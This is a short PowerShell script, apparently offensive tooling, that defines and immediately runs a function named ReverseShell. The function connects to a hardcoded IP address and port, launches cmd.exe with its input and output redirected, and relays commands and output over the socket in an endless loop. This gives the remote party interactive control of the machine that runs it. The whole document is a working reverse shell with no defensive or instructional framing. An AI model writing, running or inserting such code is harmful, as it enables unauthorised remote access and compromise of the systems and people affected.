function ReverseShell {
    $ip = "10.162.6.102"
    $port = "33008"
    
    # Create TCP client
    $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
    $stream = $client.GetStream()
    
    # Setup streams
    [byte[]]$bytes = 0..65535|%{0}
    $shell = [System.Diagnostics.ProcessStartInfo]::new()
    $shell.FileName = "cmd.exe"
    $shell.Arguments = "/c cmd.exe"
    $shell.RedirectStandardInput = $true
    $shell.RedirectStandardOutput = $true
    $shell.UseShellExecute = $false
    
    # Start process
    $process = [System.Diagnostics.Process]::Start($shell)
    $inputStream = $process.StandardInput.BaseStream
    $outputStream = $process.StandardOutput.BaseStream
    
    while ($true) {
        # Read from socket
        if ($stream.DataAvailable) {
            $bytesRead = $stream.Read($bytes, 0, 65535)
            $inputStream.Write($bytes, 0, $bytesRead)
            $inputStream.Flush()
        }
        
        # Read from process
        $outputBytes = $outputStream.ReadByte()
        if ($outputBytes -ne -1) {
            $stream.WriteByte($outputBytes)
            $stream.Flush()
        }
    }
}

ReverseShell
